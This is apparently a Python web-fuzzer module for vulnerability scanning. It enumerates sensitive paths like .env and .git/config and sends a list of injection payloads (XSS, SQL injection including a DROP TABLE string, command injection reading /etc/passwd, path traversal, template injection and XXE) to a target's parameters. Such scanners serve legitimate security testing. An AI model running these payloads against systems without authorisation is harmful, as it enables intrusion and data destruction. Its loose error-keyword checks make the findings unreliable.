#!/usr/bin/env python3
"""
Web Fuzzer Module
Advanced fuzzing for:
- Path/parameter discovery
- Input validation testing
- Error-based detection
- Time-based detection
- Reflected XSS detection
"""

import asyncio
import random
import string
import time
from typing import Dict, List, Optional, Any, Tuple
from urllib.parse import urljoin, parse_qs, urlparse, urlencode
import httpx


class WebFuzzer:
    """Advanced Web Application Fuzzer"""
    
    def __init__(self, threads: int = 30, timeout: int = 10):
        self.threads = threads
        self.timeout = timeout
        self.vulnerabilities: List[Dict[str, Any]] = []
        self.findings: Dict[str, Any] = {}
        
        # Fuzzing payloads
        self.path_payloads = [
            'admin', 'administrator', 'api', 'api/v1', 'api/v2', 'backup', 
            'config', '.env', '.git', '.git/config', 'wp-admin', 'phpmyadmin',
            'test', 'dev', 'development', 'staging', 'prod', 'console',
            'actuator', 'swagger', 'api-docs', 'graphql', 'graphiql',
            'debug', 'trace', 'logs', 'status', 'health', 'metrics',
            'upload', 'uploads', 'files', 'file', 'download', 'downloads',
            'user', 'users', 'account', 'accounts', 'profile', 'profiles',
            'dashboard', 'panel', 'manage', 'management', 'system',
            'internal', 'private', 'secure', 'secret', 'hidden',
            'old', 'new', 'temp', 'tmp', 'cache', 'export', 'import',
            '.htaccess', '.htpasswd', 'robots.txt', 'sitemap.xml',
            'server-status', 'server-info', 'phpinfo.php', 'info.php',
        ]
        
        self.param_payloads = [
            # XSS payloads
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<img src=x onerror=alert(1)>",
            "\'><img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            
            # SQL Injection
            "' OR '1'='1",
            "' OR 1=1--",
            "1' AND 1=1--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "1 AND 1=1",
            "1 AND 1=2",
            "' AND SLEEP(5)--",
            "1; WAITFOR DELAY '0:0:5'--",
            
            # Command Injection
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "`whoami`",
            "$(id)",
            ";id;",
            "|id|",
            "||id||",
            "; sleep 5",
            "| sleep 5",
            "`sleep 5`",
            
            # Path Traversal
            "../../../etc/passwd",
            "....//....//etc/passwd",
            "..%2f..%2f..%2fetc/passwd",
            "%2e%2e%2f%2e%2e%2fetc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            
            # Template Injection
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "<%= 7*7 %>",
            "{{config}}",
            "{{ ''.__class__.__mro__[2].__subclasses__() }}",
            
            # NoSQL Injection
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$where": "sleep(5000)"}',
            
            # LDAP Injection
            "*)(uid=*))(&(uid=*",
            "*))(&(",
            
            # XML/XXE
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
            '<?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><xxe>&xxe;</xxe>',
        ]
        
        self.error_signatures = [
            "sql syntax", "mysql_fetch", "pg_query", "sqlite_query",
            "ORA-", "Oracle error", "PostgreSQL", "SQLite3::",
            "Warning: mysql", "mysqli_error", "PDOException",
            "Microsoft OLE DB Provider", "ODBC SQL Server Driver",
            "Syntax error", "Parse error", "Fatal error",
            "exception", "traceback", "stack trace",
            "eval()'d code", "runtime error", "server error",
            "division by zero", "null pointer", "undefined",
            "unclosed quotation", "unterminated string",
        ]
        
        self.reflected_signatures = [
            "<script>", "onerror=", "javascript:", "alert(",
            "prompt(", "confirm(", "eval(", "document.cookie",
        ]
    
    async def fuzz_path(self, client: httpx.AsyncClient, 
                        base_url: str, path: str) -> Optional[Dict[str, Any]]:
        """Fuzz a single path"""
        url = urljoin(base_url, path)
        
        try:
            response = await client.get(url, timeout=self.timeout)
            
            result = {
                "path": path,
                "url": url,
                "status": response.status_code,
                "length": len(response.content),
                "content_type": response.headers.get('content-type', ''),
            }
            
            # Check for interesting responses
            if response.status_code == 200:
                # Check for exposed configs
                if path in ['.env', 'config.json', '.git/config']:
                    result["interesting"] = True
                    if 'SECRET' in response.text or 'PASSWORD' in response.text:
                        self.vulnerabilities.append({
                            "severity": "CRITICAL",
                            "type": "sensitive_file_exposure",
                            "description": f"Sensitive file exposed: {path}",
                            "recommendation": "Remove sensitive files from web root",
                            "url": url
                        })
            
            elif response.status_code in [301, 302]:
                result["redirect"] = response.headers.get('location', '')
            
            return result
            
        except httpx.TimeoutException:
            return {"path": path, "url": url, "status": "timeout"}
        except Exception as e:
            return None
    
    async def fuzz_parameter(self, client: httpx.AsyncClient,
                             url: str, param: str, payload: str) -> Optional[Dict[str, Any]]:
        """Fuzz a single parameter with a payload"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            # Create params if none exist
            params = {param: [payload]}
        else:
            # Add/overwrite param
            params[param] = [payload]
        
        # Rebuild URL
        new_query = urlencode(params, doseq=True)
        fuzz_url = parsed._replace(query=new_query).geturl()
        
        try:
            start_time = time.time()
            response = await client.get(fuzz_url, timeout=self.timeout)
            elapsed = time.time() - start_time
            
            result = {
                "url": fuzz_url,
                "param": param,
                "payload": payload[:50],
                "status": response.status_code,
                "length": len(response.content),
                "time": elapsed,
            }
            
            content = response.text.lower()
            
            # Check for SQL errors
            for sig in self.error_signatures:
                if sig.lower() in content:
                    result["sql_error"] = True
                    self.vulnerabilities.append({
                        "severity": "HIGH",
                        "type": "sql_injection",
                        "description": f"SQL error in response for param '{param}'",
                        "recommendation": "Use parameterized queries",
                        "evidence": f"Payload: {payload[:30]}...",
                        "url": fuzz_url
                    })
                    break
            
            # Check for reflected XSS
            if payload.lower() in content.lower():
                result["reflected"] = True
                # Check if script tags are reflected
                if any(sig in content for sig in self.reflected_signatures):
                    self.vulnerabilities.append({
                        "severity": "MEDIUM",
                        "type": "reflected_xss",
                        "description": f"Reflected XSS in parameter '{param}'",
                        "recommendation": "Sanitize user input, implement CSP headers",
                        "evidence": f"Payload: {payload[:30]}...",
                        "url": fuzz_url
                    })
            
            # Check for command injection (time-based)
            if elapsed > 4 and ('sleep' in payload.lower() or 'waitfor' in payload.lower()):
                result["time_based"] = True
                self.vulnerabilities.append({
                    "severity": "HIGH",
                    "type": "command_injection",
                    "description": f"Time-based command injection in param '{param}'",
                    "recommendation": "Avoid using user input in system commands",
                    "evidence": f"Response time: {elapsed}s",
                    "url": fuzz_url
                })
            
            return result
            
        except httpx.TimeoutException:
            if 'sleep' in payload.lower() or 'waitfor' in payload.lower():
                return {
                    "url": fuzz_url,
                    "param": param,
                    "status": "timeout",
                    "potential_blind_sqli": True
                }
            return None
        except Exception:
            return None
    
    async def discover_parameters(self, client: httpx.AsyncClient,
                                   url: str) -> List[str]:
        """Discover hidden parameters"""
        common_params = [
            'id', 'user', 'username', 'password', 'email', 'token',
            'file', 'path', 'url', 'redirect', 'next', 'return',
            'callback', 'jsonp', 'api', 'version', 'action',
            'cmd', 'exec', 'command', 'query', 'search',
            'page', 'limit', 'offset', 'sort', 'order',
            'debug', 'test', 'dev', 'admin', 'mode',
            'format', 'type', 'view', 'lang', 'locale',
        ]
        
        discovered = []
        test_value = "test123"
        
        semaphore = asyncio.Semaphore(self.threads)
        
        async def test_param(param):
            async with semaphore:
                parsed = urlparse(url)
                new_query = urlencode({param: test_value})
                test_url = parsed._replace(query=new_query).geturl()
                
                try:
                    response = await client.get(test_url, timeout=self.timeout)
                    content = response.text
                    
                    # Check if parameter is reflected or changes response
                    if test_value in content or response.status_code != 404:
                        return param
                except:
                    pass
                return None
        
        tasks = [test_param(param) for param in common_params]
        results = await asyncio.gather(*tasks)
        
        discovered = [r for r in results if r]
        return discovered
    
    async def fuzz_target(self, client: httpx.AsyncClient,
                          target: str) -> Dict[str, Any]:
        """Run full fuzzing against target"""
        self.vulnerabilities = []
        self.findings = {}
        
        # Ensure proper URL
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        discovered_paths = []
        discovered_params = []
        param_results = []
        
        # 1. Path fuzzing
        semaphore = asyncio.Semaphore(self.threads)
        
        async def fuzz_path_limited(path):
            async with semaphore:
                return await self.fuzz_path(client, target, path)
        
        # Select paths to fuzz
        paths_to_fuzz = self.path_payloads[:50]  # Limit for demo
        
        path_tasks = [fuzz_path_limited(path) for path in paths_to_fuzz]
        path_results = await asyncio.gather(*path_tasks, return_exceptions=True)
        
        for result in path_results:
            if isinstance(result, dict) and result.get('status') == 200:
                discovered_paths.append(result)
        
        # 2. Parameter discovery
        discovered_params = await self.discover_parameters(client, target)
        
        # 3. Parameter fuzzing
        if discovered_params:
            param_semaphore = asyncio.Semaphore(10)  # Lower for parameter fuzzing
            
            async def fuzz_param_limited(param, payload):
                async with param_semaphore:
                    return await self.fuzz_parameter(client, target, param, payload)
            
            # Select payloads to test
            payloads_to_test = self.param_payloads[:20]  # Limit for demo
            
            param_tasks = []
            for param in discovered_params[:3]:  # Limit params
                for payload in payloads_to_test:
                    param_tasks.append(fuzz_param_limited(param, payload))
            
            param_results_raw = await asyncio.gather(*param_tasks, return_exceptions=True)
            param_results = [r for r in param_results_raw if isinstance(r, dict)]
        
        self.findings = {
            "target": target,
            "discovered_paths": discovered_paths,
            "discovered_params": discovered_params,
            "param_tests": param_results,
            "total_paths_tested": len(paths_to_fuzz),
            "total_params_discovered": len(discovered_params),
            "total_param_tests": len(param_results),
        }
        
        return {
            "target": target,
            "vulnerabilities": self.vulnerabilities,
            "findings": self.findings,
            "info": {
                "total_vulnerabilities": len(self.vulnerabilities),
                "critical": len([v for v in self.vulnerabilities if v["severity"] == "CRITICAL"]),
                "high": len([v for v in self.vulnerabilities if v["severity"] == "HIGH"]),
                "medium": len([v for v in self.vulnerabilities if v["severity"] == "MEDIUM"]),
                "paths_discovered": len(discovered_paths),
                "params_discovered": len(discovered_params),
            }
        }
    
    async def scan(self, target: str) -> Dict[str, Any]:
        """Main scan entry point"""
        limits = httpx.Limits(max_keepalive_connections=20, max_connections=50)
        async with httpx.AsyncClient(limits=limits, follow_redirects=True) as client:
            return await self.fuzz_target(client, target)